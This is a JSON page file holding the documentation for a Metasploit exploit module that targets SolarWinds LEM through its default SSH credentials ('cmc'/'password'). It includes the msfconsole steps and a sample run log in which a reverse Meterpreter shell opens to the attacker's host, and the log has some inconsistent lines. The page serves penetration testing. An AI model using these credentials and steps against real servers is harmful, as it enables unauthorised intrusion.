{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/ssh/solarwinds_lem_exec","result":{"data":{"moduleMetadataJson":{"id":"12aeb65b-78f6-51e9-a9df-adc57f122b61","name":"SolarWinds LEM Default SSH Password Remote Code Execution","fullname":"exploit/linux/ssh/solarwinds_lem_exec","description":"This module exploits the default credentials of SolarWinds LEM. A menu system is encountered when the SSH\n        service is accessed with the default username and password which is \"cmc\" and \"password\". By exploiting a\n        vulnerability that exist on the menuing script, an attacker can escape from restricted shell.\n\n        This module was tested against SolarWinds LEM v6.3.1.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/ssh/solarwinds_lem_exec","documentationSlug":"/modules/documentation/exploit/linux/ssh/solarwinds_lem_exec","referencesSlug":"/modules/references/exploit/linux/ssh/solarwinds_lem_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the default credentials of SolarWind LEM. A menu system is encountered when the SSH service is accessed with the default username and password which is \"cmc\" and \"password\". By exploiting a vulnerability that exist on the menuing script, an attacker can escape from restricted shell.</p>\n<p>Vulnerable application can be download as a free trial from vendor webpage.\n<a href=\"http://www.solarwinds.com/log-event-manager\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://www.solarwinds.com/log-event-manager</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/ssh/solarwinds_lem_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set lhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>This is a run against a known vulnerable Solarwinds LEM server.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(solarwind_lem_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] 12.0.0.154:32022 - Attempt to login...\n[+] SSH connection is established.\n[*] Requesting pty... We need it in order to interact with menuing system.\n[+] Pty successfully obtained.\n[*] Requesting a shell.\n[+] Remote shell successfully obtained.\n[+] Step 1 is done. Managed to access terminal menu.\n[+] Step 2 is done. Managed to select &#39;service&#39; sub menu.\n[+] Step 2 is done. Managed to select &#39;service&#39; sub menu.\n[+] Step 3 is done. Managed to start &#39;restrictssh&#39; function.\n[+] Step 4 is done. We are going to try escape from jail shell.\n[+] Sweet..! Escaped from jail.\n[*] Delivering payload...\n[*] Sending stage (38651 bytes) to 12.0.0.154\n[*] Meterpreter session 3 opened (12.0.0.1:4444 -&gt; 12.0.0.154:43361) at 2017-03-17 21:59:05 +0300\n[-] Exploit failed: Errno::EBADF Bad file descriptor\n[*] Exploit completed, but no session was created.\n\nmsf exploit(solarwind_lem_exec) &gt; sessions -i 1 \n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: cmc\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"12aeb65b-78f6-51e9-a9df-adc57f122b61"}}}